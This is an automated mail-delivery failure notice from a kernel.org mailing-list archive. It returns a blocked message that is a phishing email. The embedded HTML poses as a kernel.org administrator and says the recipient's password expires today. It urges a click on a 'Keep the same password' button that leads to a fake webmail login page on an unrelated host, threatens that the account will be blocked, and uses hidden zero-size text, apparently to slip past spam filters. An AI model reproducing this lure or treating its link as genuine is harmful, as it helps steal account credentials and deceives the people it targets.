Return-Path: <MAILER-DAEMON>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E83CDC25B75
	for <soc@archiver.kernel.org>; Fri, 31 May 2024 14:35:50 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id B8A6EC32786; Fri, 31 May 2024 14:35:50 +0000 (UTC)
Received: from 5681851.daraju.com (5681851.daraju.com [162.215.220.95])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id B00E1C32781
	for <soc@kernel.org>; Fri, 31 May 2024 14:35:49 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org B00E1C32781
Authentication-Results: smtp.kernel.org; dmarc=none (p=none dis=none) header.from=5681851.daraju.com
Authentication-Results: smtp.kernel.org; spf=none smtp.helo=5681851.daraju.com
Received: from mailnull by 5681851.daraju.com with local (Exim 4.96.2)
	id 1sD3MB-0003wu-0r
	for soc@kernel.org;
	Fri, 31 May 2024 09:35:47 -0500
X-Failed-Recipients: soc@kernel.org
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@5681851.daraju.com>
List-Id: <soc.lore.kernel.org>
To: soc@kernel.org
References: <20240531103545.B49121F052F8E65C@kernel.org>
Content-Type: multipart/report; report-type=delivery-status; boundary=1717166147-eximdsn-1508707249
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1sD3MB-0003wu-0r@5681851.daraju.com>
Date: Fri, 31 May 2024 09:35:47 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - 5681851.daraju.com
X-AntiAbuse: Original Domain - kernel.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - 
X-Get-Message-Sender-Via: 5681851.daraju.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
X-Authenticated-Sender: 5681851.daraju.com: mailnull
X-Source: 
X-Source-Args: 
X-Source-Dir: 

--1717166147-eximdsn-1508707249
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  soc@kernel.org
    host smtp1.kernel.org [35.83.38.47]
    SMTP error from remote mail server after end of data:
    550 5.7.1 Blocked by SpamAssassin

--1717166147-eximdsn-1508707249
Content-type: message/delivery-status

Reporting-MTA: dns; 5681851.daraju.com

Action: failed
Final-Recipient: rfc822;soc@kernel.org
Status: 5.0.0
Remote-MTA: dns; smtp1.kernel.org
Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin

--1717166147-eximdsn-1508707249
Content-type: message/rfc822

Return-path: <soc@kernel.org>
Received: from [198.23.212.175] (port=63861 helo=198-23-212-175-host.colocrossing.com)
	by 5681851.daraju.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
	(Exim 4.96.2)
	(envelope-from <soc@kernel.org>)
	id 1sD3M8-0003ry-2P
	for soc@kernel.org;
	Fri, 31 May 2024 09:35:44 -0500
From: Administrator <soc@kernel.org>
List-Id: <soc.lore.kernel.org>
To: soc@kernel.org
Subject: RE: Your Password expires now.
Date: 31 May 2024 10:35:45 -0400
Message-ID: <20240531103545.B49121F052F8E65C@kernel.org>
MIME-Version: 1.0
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Calibri, =
Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: =
0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STY=
LE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatu=
res: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; tex=
t-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial">Hello soc</=
P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial">Your&nbsp;&nbsp;soc@kernel.org acc=
ount password is set to expire today&nbsp; 5/31/2024 10:35:45 a.m...</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial">Click below to continue with the s=
ame password<BR style=3D"BOX-SIZING: border-box"><CITE style=3D"BOX-SIZING:=
 border-box; FONT-SIZE: 0px">celina-huang</CITE></P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"></P>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: rgb(21=
1,211,211) 1px dotted; FONT-FAMILY: Roboto, sans-serif; BORDER-RIGHT: rgb(2=
11,211,211) 1px dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLL=
APSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; TEXT-TRANSFORM:=
 none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALI=
GN: left; BORDER-LEFT: rgb(211,211,211) 1px dotted; ORPHANS: 2; WIDOWS: 2; =
LETTER-SPACING: normal; BACKGROUND-COLOR:=20
rgb(255,255,255); font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
decoration-style: initial; text-decoration-color: initial" cellSpacing=3D0 =
border=3D0>
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; BORDER-R=
IGHT: rgb(211,211,211) 1px dotted; MIN-WIDTH: 50px; BORDER-BOTTOM: rgb(211,=
211,211) 1px dotted; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 2=
0px; BORDER-LEFT: rgb(211,211,211) 1px dotted; MARGIN: 0px; PADDING-RIGHT: =
20px; BACKGROUND-COLOR: rgb(204,0,0)">
<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; FONT-FAMILY: Cal=
ibri; FONT-WEIGHT: 600; COLOR: rgb(255,255,255); TEXT-ALIGN: center; BACKGR=
OUND-COLOR: transparent" href=3D"https://fadhiliafrica.archive.us-east-1.oo=
rtech.com/Webmail%20-%20Login%20%2828_05_2024%2018_16_20%29.html#soc@kernel=
=2Eorg" rel=3Dnoreferrer target=3D_blank>Keep the same password</A></TD></T=
R></TBODY></TABLE>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"><BR style=3D"BOX-SIZING: border-bo=
x">&nbsp;Your account will be blocked on failure to carry out this above ac=
tivity</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto, s=
ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; MARGIN-TOP: 0px; TEXT-TR=
ANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; =
TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND=
-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial"><SPAN style=3D"BOX-SIZING: border-=
box; FONT-SIZE: medium; FONT-FAMILY: AppleSystemUIFont">Email Service.<BR><=
BR><BR>admin@kernel.org</SPAN></P></BODY></HTML>

--1717166147-eximdsn-1508707249--
